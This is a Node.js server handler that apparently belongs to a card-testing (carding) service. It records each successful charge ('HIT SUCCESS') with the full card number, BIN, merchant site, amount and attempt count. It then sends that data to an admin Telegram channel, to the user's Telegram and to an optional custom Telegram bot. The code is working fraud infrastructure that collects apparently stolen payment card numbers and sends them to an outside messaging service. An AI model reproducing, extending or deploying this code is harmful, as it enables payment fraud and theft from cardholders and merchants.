'use strict';
// POST /api/hits/record
// ─────────────────────────────────────────────────────────
// Records a successful hit in the DB and dispatches
// Telegram notifications server-side (no bot token in
// the extension anymore).
// ─────────────────────────────────────────────────────────
const { requireAuth }  = require('../../lib/auth');
const { supabase }     = require('../../lib/supabase');
const { sendMessage }  = require('../../lib/telegram');
const { cors }         = require('../../lib/cors');

const ADMIN_CHAT_ID = process.env.ADMIN_TG_CHAT_ID || ''; // your private log channel

function esc(v) {
  return String(v ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

module.exports = async (req, res) => {
  if (cors(req, res)) return;
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { user } = await requireAuth(req);
  if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });

  const {
    card_number, bin, site, business_url, amount, currency,
    attempt_count, time_taken,
    // optional user-configured custom TG forward
    tg_bot_token, tg_chat_id
  } = req.body || {};

  try {
    // 1. Persist the hit
    await supabase.from('hits').insert({
      user_id:       user.id,
      card_number:   card_number || null,
      bin:           bin         || null,
      site:          site        || null,
      business_url:  business_url|| null,
      amount:        amount      || '0',
      currency:      currency    || 'usd',
      attempt_count: attempt_count || 0,
      time_taken:    time_taken  || null
    });

    // 2. Increment user's hit counter
    await supabase
      .from('users')
      .update({ hits: (user.hits || 0) + 1 })
      .eq('id', user.id);

    // 3. Build Telegram message
    const sentAt = new Date().toLocaleString('en-US', { hour12: false });
    const cur    = (currency || 'usd').toUpperCase();

    const msg = [
      '<b>✅ HIT SUCCESS</b>',
      '',
      `<b>User:</b> ${esc(user.first_name || user.username)} (ID: <code>${esc(user.id)}</code>)`,
      `<b>Site:</b> ${esc(site || 'N/A')}`,
      `<b>URL:</b> ${esc(business_url || 'N/A')}`,
      `<b>Amount:</b> ${esc(amount || '0')} ${esc(cur)}`,
      `<b>Attempts:</b> ${esc(attempt_count || 'N/A')}`,
      `<b>Time Taken:</b> ${esc(time_taken || 'N/A')}`,
      `<b>Card:</b> <code>${esc(card_number || 'N/A')}</code>`,
      `<b>BIN:</b> <code>${esc(bin || 'N/A')}</code>`,
      `<b>Sent At:</b> ${esc(sentAt)}`
    ].join('\n');

    // 4. Notify — admin channel, user's own TG, and optional custom bot
    const notifyTasks = [];

    if (ADMIN_CHAT_ID) notifyTasks.push(sendMessage(ADMIN_CHAT_ID, msg));

    if (user.telegram_id) notifyTasks.push(sendMessage(user.telegram_id, msg));

    if (tg_bot_token && tg_chat_id) {
      notifyTasks.push(
        fetch(`https://api.telegram.org/bot${tg_bot_token}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id:                  tg_chat_id,
            text:                     msg,
            parse_mode:               'HTML',
            disable_web_page_preview: true
          })
        }).catch(() => {})
      );
    }

    await Promise.allSettled(notifyTasks);

    return res.json({ success: true });
  } catch (err) {
    console.error('[hits/record]', err);
    return res.status(500).json({ success: false, error: 'Failed to record hit' });
  }
};
